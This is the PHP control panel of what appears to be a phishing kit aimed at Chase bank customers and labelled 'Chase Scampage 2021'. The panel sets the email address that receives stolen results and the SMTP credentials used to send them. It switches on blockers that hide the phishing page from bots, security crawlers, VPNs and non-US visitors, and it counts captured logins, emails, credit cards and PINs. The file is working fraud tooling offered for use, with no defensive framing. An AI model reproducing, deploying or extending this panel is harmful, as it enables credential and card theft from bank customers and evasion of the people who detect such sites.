<?php
defined('SYSTEM_PATH') or define('SYSTEM_PATH', __DIR__ . '/../');
error_reporting(0);
spl_autoload_register(function($class)
{
    require_once(SYSTEM_PATH . '/NubicodStyle/system/core/' . $class . '.nubicod.php');
});
$core = new Core;

# Check Password
if (file_exists(SYSTEM_PATH . '/NubicodStyle/system/setting/config.ini')) {
    if ($core->_config('password') !== $_GET['passw']) {
        exit('<script>alert("You can\'t access this page.")</script><meta http-equiv="refresh" content="0; url=http://href.li/?https://google.com/"/>');
    }
}

if (isset($_POST['save1'])) {
    @unlink(SYSTEM_PATH . '/NubicodStyle/system/setting/config.ini');
    $data['result']     = trim($_POST['result']);
    $data['parameter']  = trim($_POST['parameter']);
    $data['passcam']    = trim($_POST['passcam']);
    $data['sender']     = $_POST['sender'];
    $data['lock_us']    = $_POST['lock_us'];
    $data['block_ip']   = $_POST['block_ip'];
    $data['block_ua']   = $_POST['block_ua'];
    $data['block_host'] = $_POST['block_host'];
    $data['block_isp']  = $_POST['block_isp'];
    $data['block_vpn']  = $_POST['block_vpn'];

    if ($core->_create($data)) {
        echo "<script>alert('Success');</script>";
        echo "<meta http-equiv='refresh' content='0; url=/iloveu/" . $data['passcam'] . "'/>";
    } else {
        echo "<script>alert('Gagal');</script>";
        echo "<meta http-equiv='refresh' content='0; url=/iloveu/'/>";
    }
}

if (isset($_POST['delete1'])){
  @unlink(SYSTEM_PATH . '/NubicodStyle/system/setting/config.ini');
  echo "<script>alert('deleted');</script>";
  echo "<meta http-equiv='refresh' content='0; url=/iloveu/'/>";
}

if (isset($_POST['resetlog'])){
  $mainlog = ['bots.log', 'sending.log', 'visitor.log'];
  $sublog = ['visitor','login','mail','cc','pin'];
  $dir = SYSTEM_PATH . '/NubicodStyle/logs/';
  foreach($mainlog as $main){
    $core->_write($dir.$main, '', 'w');
  }

  foreach($sublog as $sub){
    $core->_write($dir.$sub, '0', 'w');
  }
  echo "<script>alert('reseted');</script>";
  echo "<meta http-equiv='refresh' content='0; url=/iloveu/" . $core->_config('password') . "'/>";
}

if (isset($_POST['save2'])){
  @unlink(SYSTEM_PATH . '/NubicodStyle/system/setting/smtp.ini');
  $data['host']     = trim($_POST['host']);
  $data['port']     = trim($_POST['port']);
  $data['secure']   = trim($_POST['secure']);
  $data['username'] = trim($_POST['smtpuser']);
  $data['password'] = trim($_POST['smtppass']);

  if ($core->_create($data, 'smtp')) {
      echo "<script>alert('Success');</script>";
      echo "<meta http-equiv='refresh' content='0; url=/iloveu/" . $core->_config('password') . "'/>";
  } else {
      echo "<script>alert('Gagal');</script>";
      echo "<meta http-equiv='refresh' content='0; url=/iloveu/" . $core->_config('password') . "'/>";
  }
}

if (isset($_POST['delete2'])) {
  @unlink(SYSTEM_PATH . '/NubicodStyle/system/setting/smtp.ini');
  echo "<script>alert('deleted');</script>";
  echo "<meta http-equiv='refresh' content='0; url=/iloveu/" . $core->_config('password') . "'/>";
}

if (isset($_POST['testsend'])) {
    if (!file_exists(SYSTEM_PATH . '/NubicodStyle/system/setting/smtp.ini')) {
        echo "<script>alert('ADD SMTP BEFORE TEST SEND');</script>";
        echo "<meta http-equiv='refresh' content='0; url=/iloveu/" . $core->_config('password') . "'/>";
    } else {
        if ($core->_send(trim($_POST['testemail']), 'Test Conection', 'Successful received', 'Hello, this is email test from Nubicod Panel.', 'test') == TRUE) {
            $core->_sendlog('SMTP', trim($_POST['testemail']), 'Test', 'Success');
            echo "<script>alert('Sent!');</script>";
            echo "<meta http-equiv='refresh' content='0; url=/iloveu/" . $core->_config('password') . "'/>";
        } else {
            $core->_sendlog('SMTP', trim($_POST['testemail']), 'Test', 'Failed');
            echo "<script>alert('Something wrong with your smtp.');</script>";
            echo "<meta http-equiv='refresh' content='0; url=/iloveu/" . $core->_config('password') . "'/>";
        }
    }
}
echo '
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <meta charset="utf-8">
    <title>Ruthvens Family - Chase Scampage 2021</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="/NubicodStyle/assets/vendor/css/bootstrap.css">
    <style>
        body {
            min-height: 1040px;
            padding-top: 70px;
        }

        .footer {
            position: fixed;
            left: 0;
            bottom: 0;
            width: 100%;
        }

        textarea {
            resize: none;
        }
    </style>
</head>

<body class="bg-light">
    <nav class="navbar navbar-expand-lg fixed-top navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="#">[Ruthvens] Family</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav mr-auto mt-2 mt-lg-0">
                    <li class="nav-item">
                        <a class="nav-link" href="#Home" onclick="toMenu(\'Home\')">HOME</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#SMTP" onclick="toMenu(\'SMTP\')">SMTP</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#Visitor" onclick="toMenu(\'Visitor\')">LOGS</a>
                    </li>
                </ul>

                <ul class="navbar-nav my-2 my-lg-0">
                    <li class="nav-item m-1">
                        <button type="button" class="btn btn-outline-success"><span id="jmlhvisitor"></span> VISITOR</button>
                    </li>
                    <li class="nav-item m-1">
                        <button type="button" class="btn btn-outline-primary"><span id="jmlhlogin"></span> LOGIN</button>
                    </li>
                    <li class="nav-item m-1">
                        <button type="button" class="btn btn-outline-secondary"><span id="jmlhmail"></span> EMAIL</button>
                    </li>
                    <li class="nav-item m-1">
                        <button type="button" class="btn btn-outline-danger"><span id="jmlhcc"></span> CREDITCARD</button>
                    </li>
                    <li class="nav-item m-1">
                        <button type="button" class="btn btn-outline-info"><span id="jmlhpin"></span> PIN</button>
                    </li>
                    <li class="nav-item m-1">
                        <button type="button" class="btn btn-outline-light"><span id="jmlhbot"></span> BOTS</button>
                    </li>
                </ul>

            </div>
        </div>
    </nav>

    <div id="isi">
        <div id="Home" class="KontenMenu">
            <div class="container-fluid">
                <div class="row pt-2">
                    <div class="col-3">&nbsp;</div>
                    <div class="col-6">
                        <div class="card m-2">
                            <div class="card-header bg-primary text-white text-center">Main Config</div>
                            <div class="card-body">
                                <form method="post">
                                    <div class="form-group row">
                                        <label for="emailres" class="col-sm-3 col-form-label">Email Result</label>
                                        <div class="col-sm-9">
                                            <input type="text" class="form-control" name="result" id="emailres" placeholder="result@nubicod.com" value="' . $core->_config('result') . '">
                                        </div>
                                    </div>
                                    <div class="form-group row">
                                        <label for="parameter" class="col-sm-3 col-form-label">Parameter</label>
                                        <div class="col-sm-9">
                                            <input type="text" id="parameter" name="parameter" class="form-control" placeholder="/?parameter" value="' . $core->_config('parameter') . '">
                                        </div>
                                    </div>
                                    <div class="form-group row">
                                        <label for="passcam" class="col-sm-3 col-form-label">Panel Password</label>
                                        <div class="col-sm-9">
                                            <input type="text" id="passcam" name="passcam" class="form-control" placeholder="/iloveu/{panelpass}" value="' . $core->_config('password') . '">
                                        </div>
                                    </div>
                                    <div class="form-group row">
                                        <label for="passcam" class="col-sm-3 col-form-label">Sender</label>
                                        <div class="col-sm-9">
                                            <div class="form-check form-check-inline">
                                                <input class="form-check-input" type="radio" name="sender" id="mail" value="1" ' . ($core->_config('sender') == '1' ? 'checked' : '') . '>
                                                <label class="form-check-label" for="mail">MAIL</label>
                                            </div>
                                            <div class="form-check form-check-inline">
                                                <input class="form-check-input" type="radio" name="sender" id="smtpform" value="0" ' . ($core->_config('sender') == '0' ? 'checked' : '') . '>
                                                <label class="form-check-label" for="smtpform">SMTP</label>
                                            </div>
                                        </div>
                                    </div>
                            </div>
                        </div>

                        <div class="card m-2">
                            <div class="card-header bg-danger text-white text-center">Blocker Config</div>
                            <div class="card-body">
                                <div class="form-group row">
                                    <label for="passcam" class="col-sm-4 col-form-label">LOCK COUNTRY US</label>
                                    <div class="col-sm-8">
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="lock_us" id="true1" value="1" ' . ($core->_config('lock_us') == '1' ? 'checked' : '') . '>
                                            <label class="form-check-label" for="true1">True</label>
                                        </div>
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="lock_us" id="false1" value="0" ' . ($core->_config('lock_us') == '0' ? 'checked' : '') . '>
                                            <label class="form-check-label" for="false1">False</label>
                                        </div>
                                    </div>
                                </div>

                                <div class="form-group row">
                                    <label for="passcam" class="col-sm-4 col-form-label">IP BLOCK</label>
                                    <div class="col-sm-8">
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="block_ip" id="true2" value="1" ' . ($core->_config('block_ip') == '1' ? 'checked' : '') . '>
                                            <label class="form-check-label" for="true2">True</label>
                                        </div>
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="block_ip" id="false2" value="0" ' . ($core->_config('block_ip') == '0' ? 'checked' : '') . '>
                                            <label class="form-check-label" for="false2">False</label>
                                        </div>
                                    </div>
                                </div>

                                <div class="form-group row">
                                    <label for="passcam" class="col-sm-4 col-form-label">USER-AGENT BLOCK</label>
                                    <div class="col-sm-8">
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="block_ua" id="true3" value="1" ' . ($core->_config('block_useragent') == '1' ? 'checked' : '') . '>
                                            <label class="form-check-label" for="true3">True</label>
                                        </div>
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="block_ua" id="false3" value="0" ' . ($core->_config('block_useragent') == '0' ? 'checked' : '') . '>
                                            <label class="form-check-label" for="false3">False</label>
                                        </div>
                                    </div>
                                </div>

                                <div class="form-group row">
                                    <label for="passcam" class="col-sm-4 col-form-label">HOSTNAME BLOCK</label>
                                    <div class="col-sm-8">
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="block_host" id="true4" value="1" ' . ($core->_config('block_host') == '1' ? 'checked' : '') . '>
                                            <label class="form-check-label" for="true4">True</label>
                                        </div>
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="block_host" id="false4" value="0" ' . ($core->_config('block_host') == '0' ? 'checked' : '') . '>
                                            <label class="form-check-label" for="false4">False</label>
                                        </div>
                                    </div>
                                </div>

                                <div class="form-group row">
                                    <label for="passcam" class="col-sm-4 col-form-label">ISP BLOCK</label>
                                    <div class="col-sm-8">
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="block_isp" id="true5" value="1" ' . ($core->_config('block_isp') == '1' ? 'checked' : '') . '>
                                            <label class="form-check-label" for="true5">True</label>
                                        </div>
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="block_isp" id="false5" value="0" ' . ($core->_config('block_isp') == '0' ? 'checked' : '') . '>
                                            <label class="form-check-label" for="false5">False</label>
                                        </div>
                                    </div>
                                </div>

                                <div class="form-group row">
                                    <label for="passcam" class="col-sm-4 col-form-label">VPN/PROXY BLOCK</label>
                                    <div class="col-sm-8">
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="block_vpn" id="true6" value="1" ' . ($core->_config('block_vpn') == '1' ? 'checked' : '') . '>
                                            <label class="form-check-label" for="true6">True</label>
                                        </div>
                                        <div class="form-check form-check-inline">
                                            <input class="form-check-input" type="radio" name="block_vpn" id="false6" value="0" ' . ($core->_config('block_vpn') == '0' ? 'checked' : '') . '>
                                            <label class="form-check-label" for="false6">False</label>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="card m-2">
                            <div class="card-header bg-dark text-white text-center">Action</div>
                            <div class="card-body">
                                <div class="form-group form-inline">
                                    <div class="col-sm-10">
                                        <button type="submit" name="save1" class="btn btn-primary">Save</button>
                                        <button type="submit" name="delete1" class="btn btn-danger">Delete</button>
                                        <button type="reset" class="btn btn-secondary">Reset</button>
                                        <button type="submit" name="resetlog" class="btn btn-warning text-white">Reset Log</button>
                                    </div>
                                </div>
                                </form>
                            </div>
                        </div>

                    </div>
                    <div class="col-3">&nbsp;</div>
                </div>
            </div>
        </div>

        <div id="SMTP" class="KontenMenu" style="display: none;">
            <div class="container-fluid">
                <div class="row pt-2 mb-4">
                    <div class="col-3">&nbsp;</div>
                    <div class="col-6">
                        <div class="card m-2">
                            <div class="card-header bg-success text-white text-center">SMTP Config</div>
                            <div class="card-body">
                                <form method="post">
                                    <div class="form-group row">
                                        <label for="host" class="col-sm-3 col-form-label">Host</label>
                                        <div class="col-sm-9">
                                            <input type="text" class="form-control" name="host" id="host" placeholder="smtp.example.com" value="' . $core->_smtp('host') . '">
                                        </div>
                                    </div>
                                    <div class="form-group row">
                                        <label for="ports" class="col-sm-3 col-form-label">Port</label>
                                        <div class="col-sm-9">
                                            <input type="text" id="ports" name="port" class="form-control" placeholder="465" value="' . $core->_smtp('port') . '">
                                        </div>
                                    </div>
                                    <div class="form-group row">
                                        <label for="Secure" class="col-sm-3 col-form-label">Secure</label>
                                        <div class="col-sm-9">
                                            <select class="form-control" name="secure" id="Secure">
                                                <option value="tls" ' . ($core->_smtp('secure') == 'tls' ? 'selected' : '') . '>TLS</option>
                                                <option value="ssl" ' . ($core->_smtp('secure') == 'ssl' ? 'selected' : '') . '>SSL</option>
                                            </select>
                                        </div>
                                    </div>
                                    <div class="form-group row">
                                        <label for="smtpusers" class="col-sm-3 col-form-label">Username</label>
                                        <div class="col-sm-9">
                                            <input type="text" id="smtpusers" name="smtpuser" class="form-control" placeholder="username@example.tst" value="' . $core->_smtp('username') . '">
                                        </div>
                                    </div>
                                    <div class="form-group row">
                                        <label for="smtppasss" class="col-sm-3 col-form-label">Password</label>
                                        <div class="col-sm-9">
                                            <input type="text" id="smtppasss" name="smtppass" class="form-control" placeholder="password" value="' . $core->_smtp('password') . '">
                                        </div>
                                    </div>
                            </div>
                        </div>

                        <div class="card m-2">
                            <div class="card-header bg-dark text-white text-center">Action</div>
                            <div class="card-body">
                                <div class="form-group form-inline">
                                    <div class="col-sm-10">
                                        <button type="submit" name="save2" class="btn btn-primary">Save</button>
                                        <button type="submit" name="delete2" class="btn btn-danger">Delete</button>
                                        <button type="reset" class="btn btn-secondary">Reset</button>
                                    </div>
                                </div>
                                </form>
                            </div>
                        </div>

                        <div class="card m-2">
                            <div class="card-header bg-info text-white text-center">Test Connection (CLOSED)</div>
                            <div class="card-body">
                                <form class="form-inline" method="post">
                                    <div class="form-group mb-2">
                                        <input type="text" disabled class="form-control-plaintext" value="Email To">
                                    </div>
                                    <div class="form-group mx-sm-2 mb-2">
                                        <input type="email" class="form-control" name="testemail" placeholder="email@example.tst" disabled>
                                    </div>
                                    <button type="submit" name="testsend" class="btn btn-primary mb-2" disabled>Send</button>
                                </form>
                            </div>
                        </div>

                    </div>
                    <div class="col-3">&nbsp;</div>
                </div>
            </div>

        </div>

        <div id="Visitor" class="KontenMenu" style="display: none;">
            <div class="container-fluid">
                <div class="row pt-2 mb-4">
                    <div class="col-3">&nbsp;</div>
                    <div class="col-6">
                        <div class="card m-2">
                            <div class="card-header bg-dark text-white text-center">LOGS</div>
                            <div class="card-body">
                                <div class="form-group text-center">
                                    <label for="Visitor">VISITOR</label>
                                    <textarea disabled class="form-control" id="VisitorLog" rows="10"></textarea>
                                </div>
                                <div class="form-group text-center">
                                    <label for="Visitor">BOT</label>
                                    <textarea disabled class="form-control" id="BotLog" rows="10"></textarea>
                                </div>
                                <div class="form-group text-center">
                                    <label for="smtptrack">MAIL/SMTP TRACKER</label>
                                    <textarea disabled class="form-control" id="SmtpTrack" rows="10"></textarea>
                                </div>
                            </div>
                        </div>

                    </div>
                    <div class="col-3">&nbsp;</div>
                </div>
            </div>

        </div>

    </div>

    <footer class="footer bg-dark text-white text-center p-2">
        <div class="container">
            Copyright &copy; 2015-2020 Ruthvens Family. Powered by Nubicod.com.
        </div>
    </footer>

    <script type="text/javascript" src="/NubicodStyle/assets/js/jquery.min.js"></script>
    <script type="text/javascript" src="/NubicodStyle/assets/vendor/js/bootstrap.js"></script>
    <script type="text/javascript" src="/NubicodStyle/assets/js/admin.js"></script>
</body>

</html>
';

?>
